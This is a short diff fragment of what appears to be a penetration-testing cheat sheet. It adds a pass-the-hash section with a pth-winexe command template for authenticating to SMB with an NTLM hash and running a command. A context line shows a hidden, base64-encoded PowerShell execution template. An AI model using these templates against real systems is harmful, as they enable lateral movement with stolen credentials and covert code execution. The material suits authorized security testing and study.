@@ -1988,6 +1988,14 @@ powershell -e base64_payload_here -w hidden -nop
 
 
 
+## PTH-TOOLKIT
+```bash
+# authenticate to SMB with pass-the-hash + execute command
+pth-winexe -U domain_here/user_name_here%LM+NTLM_hash_here //SMB_share_here command_here
+```
+
+
+
 ## PYTHON & PYTHON3
 ```python
 # user python path from env
